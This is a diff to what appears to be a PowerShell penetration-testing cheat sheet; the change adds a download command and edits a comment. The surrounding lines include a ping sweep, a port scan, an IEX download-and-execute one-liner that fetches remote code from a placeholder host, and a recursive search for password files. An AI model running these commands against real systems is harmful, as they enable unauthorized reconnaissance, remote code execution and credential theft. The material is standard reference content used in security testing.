@@ -562,8 +562,9 @@ PS C:\> Get-FileHash -Algorithm SHA1 file.txt													#Get the SHA1 hash of 
 PS C:\> Get-Process | Export-Csv procs.csv													#Exporting output to CSV
 PS C:\> 1..255 | % {echo "10.10.10.$_";ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}							#Conduct a ping sweep
 PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null				#Conduct a port scan
-PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://[IP_ADDRESS]:[PORT]/[FILE]","[FILE]")						#Fetch a file via HTTP (wget in PowerShell)
+PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://[IP_ADDRESS]:[PORT]/[FILE]","[FILE]")						#Fetch a file via HTTP (wget in PowerShell - any version)
 PS C:\> IEX(New-Object Net.WebClient).downloadString('http://[IP_ADDRESS]:[PORT]/[FILE]')							#"Wget" something and execute it
+PS C:\> Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"  						#Fetch a file via HTTP (wget in PowerShell 4.0 & 5.0)
 PS C:\> Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt										#Find all files with a particular name
 PS C:\> Get-HotFix																#Get a listing of all installed Microsoft Hotfixes
 PS C:\> cd HKLM:\																#Navigate the Windows registry
